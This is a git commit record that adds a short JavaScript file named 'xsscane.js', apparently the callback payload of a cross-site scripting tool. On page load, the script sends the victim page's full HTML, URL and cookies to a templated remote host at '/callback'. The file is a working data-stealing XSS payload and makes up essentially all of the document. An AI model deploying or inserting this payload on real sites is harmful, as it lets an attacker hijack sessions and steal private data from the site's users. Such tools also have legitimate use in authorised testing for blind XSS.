87f4762bd0a63b063b2c0ee1ae5e29a46c665950
Jack Rendor <12821606+jackrendor@users.noreply.github.com>
2023-02-04 16:00:08 +0100

    JavaScript file for callback data

---
+++ xsscane.js
@@ -0,0 +1,15 @@
+window.onload = function() {
+    fetch("http://{{.}}/callback", {
+        method: 'POST',
+        headers: {
+            'Accept': 'application/json, text/plain, */*',
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "body": document.documentElement.innerHTML,
+            "url": document.URL,
+            "cookie": document.cookie
+        })
+    })
+};
+
